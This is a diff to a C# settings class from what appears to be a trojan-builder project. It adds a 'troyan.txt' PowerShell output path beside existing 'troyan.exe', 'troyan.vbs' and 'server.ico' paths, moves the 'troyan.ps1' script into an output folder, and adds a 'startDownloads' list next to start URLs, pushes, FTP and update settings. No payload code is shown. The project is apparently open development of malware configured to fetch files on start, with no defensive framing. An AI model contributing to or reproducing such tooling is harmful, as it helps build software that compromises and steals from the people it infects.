@@ -17,11 +17,12 @@ namespace model
         [JsonPropertyName("sysDir")] public string SysDir => ServerModelLoader.SysDirStatic;
         [JsonPropertyName("adsDir")] public string AdsDir => ServerModelLoader.AdsDirStatic;
         [JsonPropertyName("publishedAdsDir")] public string PublishedAdsDir => ServerModelLoader.PublishedAdsDirStatic;
-        [JsonPropertyName("publishedDynamicDataDir")] public string PublishedDynamicDataDir => ServerModelLoader.PublishedDynamicDataDirStatic;
-        [JsonPropertyName("updDir")] public string UpdDir => ServerModelLoader.UpdDirStatic;
+        [JsonPropertyName("publishedDataDir")] public string PublishedDataDir => ServerModelLoader.PublishedDataDirStatic;
+        
+        public string UpdateFile  { get; set; }
         
         [JsonPropertyName("troyanDir")] public string TroyanDir => ServerModelLoader.TroyanDirStatic;
-        [JsonPropertyName("troyanScript")] public string TroyanScript => Path.Join(TroyanDir, "troyan.ps1");
+        [JsonPropertyName("troyanScript")] public string TroyanScript => Path.Join(TroyanDir, ".\\_output\\troyan.ps1");
         
         [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => ServerModelLoader.TroyanScriptDirStatic;
         [JsonPropertyName("troyanDelphiDir")] public string TroyanDelphiDir => ServerModelLoader.TroyanDelphiDirStatic;
@@ -40,6 +41,7 @@ namespace model
         [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
         [JsonPropertyName("userDelphiExe")] public string UserDelphiPath => Path.Join(UserDataDir, "troyan.exe");
         [JsonPropertyName("userVbsFile")] public string UserVbsFile => Path.Join(UserDataDir, "troyan.vbs");
+        [JsonPropertyName("userPowershellFile")] public string UserPowershellFile => Path.Join(UserDataDir, "troyan.txt");
         [JsonPropertyName("userDelphiIco")] public string UserDelphiIco => Path.Join(UserDataDir, "server.ico");
 
         //FTP
@@ -48,7 +50,9 @@ namespace model
         
         
         //Update
-        [JsonPropertyName("updateUrl")] public string UpdateUrl { get; set; }
+        [JsonPropertyName("updateUrl")]
+        public string UpdateUrl  { get; set; }
+        
 
 
         // properties
@@ -75,6 +79,8 @@ namespace model
         [JsonPropertyName("ipDomains")] public Dictionary<string, string> IpDomains { get; set; }
 
         [JsonPropertyName("pushes")] public List<string> Pushes { get; set; }
+        
+        [JsonPropertyName("startDownloads")] public List<string> StartDownloads { get; set; }
 
         [JsonPropertyName("startUrls")] public List<string> StartUrls { get; set; }
 
@@ -112,6 +118,7 @@ namespace model
             AutoUpdate = false;
             Domains = new List<string>();
             StartUrls = new List<string>();
+            StartDownloads = new List<string>();
             Interfaces = new List<string>();
             Pushes = new List<string>();
             IpDomains = new();
